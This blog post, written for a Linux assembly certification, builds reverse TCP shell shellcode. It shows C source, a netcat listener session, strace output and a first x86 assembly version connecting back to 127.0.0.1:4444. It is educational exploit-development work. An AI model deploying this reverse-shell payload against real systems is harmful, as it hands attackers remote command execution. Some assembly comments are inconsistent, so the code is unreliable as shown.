h2. Assignment 2

This blog post has been created for completing the requirements fo the SecurityTube
Linux Assembly Expert certification:
"http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert":http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert":http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert

Student ID: SLAE-824


h3. Requirements

* Create a Shell Reverse TCP shellcode
** Reverse connects to configured IP and PORT
** Execs Shell on successful connection
* IP and Port should be easily configurable


h3. Strategy

My approach to building a tcp reverse shell shellcode will be to:

* Build off of our TCP bind shell developed in "Assignment 1":http://www.brettlischalk.com/posts/18-slae-problem-1-tcp-bind-shell-shellcode of the SLAE
* Modify the C program to call @connect@ instead of @bind@, @listen@, and @accept@
* Analyze the C program system calls to see how the program interacts with the kernel to accomplish its tasks
* Lookup the system calls and see what arguments and structures they take
* Attempt to write some assembly that calls the same system calls in the same order with the same arguments as the C program does
* Debug issues as of course there will be :)



h3. The Source Code

The source code and tools referenced in this article can be found here:


h3. The C progam

#+BEGIN_SRC c
  #include <stdio.h>
  #include <netinet/in.h>
  #define PORT 4444

  int main(int argc, char **argv) {
    // Create a socket
    int lsock = socket(AF_INET, SOCK_STREAM, 0);

    // Setup servr side config struct
    // We configure:
    // The family:IPv4
    // The interface: 127.0.0.1 (Loopback)
    // The port: port#
    struct sockaddr_in config;
    config.sin_family = AF_INET;
    config.sin_addr.s_addr = inet_addr("127.0.0.1");
    // The htons() function converts the
    // unsigned short integer hostshort from host byte
    // order to network byte order.
    config.sin_port = htons(PORT);

    // Redirect stdin, stdout, and stderror
    dup2(lsock, 0);
    dup2(lsock, 1);
    dup2(lsock, 2);

    // Connect to listening server
    int csock = connect(lsock, (struct sockaddr *) &config, sizeof(config));

    // Execute a shell
    execve("/bin/sh", NULL, NULL);
  };

#+END_SRC


h3. Analysis of the C progam

Let's compile our program with @gcc reversetcpshell.c -o reversetcpshell@.
Next, lets start Netcat listening for a connection using @nc -nlvp 4444@.
Now that we have Netcat waiting for a connection we can go ahead and
execute our reversetcpshell with @./reversetcpshell@. If we look over
at our Netcat terminal we will see that we have a received a connection
and been presented with a shell!

#+BEGIN_SRC sh
  root@blahblah:~/shared/SLAE/slae/exercise2# nc -nlvp 4444
  listening on [any] 4444 ...
  connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 37260
  ls
  README.org
  reversetcpshell
  reversetcpshell.c
#+END_SRC

Once again, if we use @strace ./reversetcpshell@ when starting the reverse
shell we can see the system calls being made:

#+BEGIN_SRC sh
  socket(PF_INET, SOCK_STREAM, IPPROTO_IP) = 3
  dup2(3, 0)                              = 0
  dup2(3, 1)                              = 1
  dup2(3, 2)                              = 2
  connect(3, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("127.0.0.1")}, 16) = 0
  execve("/bin/sh", [0], [/* 0 vars */])  = 0
#+END_SRC

Interestingly, our c program is shorter and the amount of system calls
that we need seems to have decreased. It seems as though our reverse
tcp shellcode could be as basic as using @socket, dup2, connect, and execve@.
Essentially we can not worry about @bind, listen, or accept@ and just need
to learn about 1 system call we haven't used before: @connect@.

Ok, what can we lear about connect?


#+BEGIN_SRC c
  int connect(int socket, const struct sockaddr *address, socklen_t address_len);
#+END_SRC

If we remember the function signature of bind:

#+BEGIN_SRC c
  int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
#+END_SRC

We see that they are exactly the same! The only difference is that when
we define the sockaddr structure that we want to specify the IP of the
machine that we want to connect back to instead of the 0.0.0.0 IP we
specified in our bindshell.

Cool! Lets write some assembly...


h3. Assembly: Take 1

If we remember from making our research when creating our bindshell,
the system call for @SYS_CONNECT@ was:

#+BEGIN_SRC C
  #define SYS_CONNECT 3   /* sys_connect(2)   */
#+END_SRC

So in theory, if we modify our assembly to call 3 install of 2 e.g
connect instead of bind, remove unnecessary system calls, and make
sure that we redirect stdin,stdout,and stderror before making our
connection we should be in good shape. Lets give that a go:

#+BEGIN_SRC asm
  global _start

  section .text
    _start:
      ;; Create a socket
      ;; int socketcall(int call, unsigned long *args);
      ;; int socket(int domain, int type, int protocol);
      ;; #define SYS_SOCKET 1   /* sys_socket(2)    */
      ;; Use socketcall to call down to socket
      xor eax, eax
      mov al, 0x66 ; socketcall syscall
      xor ebx, ebx
      mov bl, 0x1 ; sys_socket syscall number

      ;; Put the socket() args on the stack
      xor ecx, ecx
      push ecx ; INADDR_ANY Accept on any interface 0x00000000
      push ebx ; SOCK_STREAM is the type of socket 1

      push 0x2 ; protocol af_inet is the ip protocol 2

      mov ecx, esp ; save pointer to args for the socket() call
      int 0x80 ; call sys_socket

      ; save the returned listening socket file descriptor
      xor edi, edi
      mov edi, eax


      ;; Connect on the socket
      xor eax, eax
      mov al, 0x66 ; socketcall syscall

      ;; Start building the sockaddr_in structure
      ;; Since the structure is laid out as:
      ;; sin_family, sin_port, sin_addr
      ;; we need to push the values onto the stack
      ;; in reverse order
      ;; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
      ;; sin_addr= inet_addr("127.0.0.1) = 0x0100007f
      ;; loop back addr is 127.0.0.1
      ;; this translates to 0x0100007f
      ;; we don't want to have null bytes 0x00
      ;; so we add 0x01010101 to our address
      ;; move it into a register
      ;; and then subtract
      xor ecx, ecx
      mov ecx, 0x02010180 ; 0x0100007f
      sub ecx, 0x01010101
      push ecx ; inet_addr("127.0.0.1) = 0x0100007f
      ;;push 0x0101017f ; inet_addr("127.1.1.1")

      ;; 4444 is 0x115c in little endian. Network byte order is
      ;; Big endian so we swap the byte ordering
      push word 0x5c11 ; sin_port=4444 (network byte order)
      ;; bl is sys_connect syscallnumber 0x3
      ;; prior to the next instruction
      ;; subtract one to bring it to 0x2
      ;; which is what AF_INET represents
      inc ebx
      push word bx     ; sin_family=AF_INET (0x2)
      mov ecx, esp     ; move pointer to sockaddr_in structure


      ;; In the initial code we use sizeof to derive the addrlen
      ;; If we print the results of that we get 0x10 which is 16 bytes
      push 0x10 ;addrlen=16
      push ecx  ;struct sockaddr pointer
      push edi  ;sockfd
      mov ecx, esp ;save pointer to bind() args
      inc ebx
      int 0x80 ; call sys_connect

      ;; call dup2 for stdin, stdout, and stderr in a loop
      xor ecx, ecx
      mov cl, 0x2 ;loop counter
      xor eax, eax
    dup2:
      mov al, 0x3f ;dup2
      int 0x80
      dec ecx
      jns dup2

      ;; Call execve
      xor eax, eax
      mov al, 0xb ;execve
      xor ebx, ebx
      push ebx
      push 0x68732f2f ;"sh//"
      push 0x6e69622f ;"nib/"
      mov ebx, esp
      xor ecx, ecx
      xor edx, edx
      int 0x80
#+END_SRC
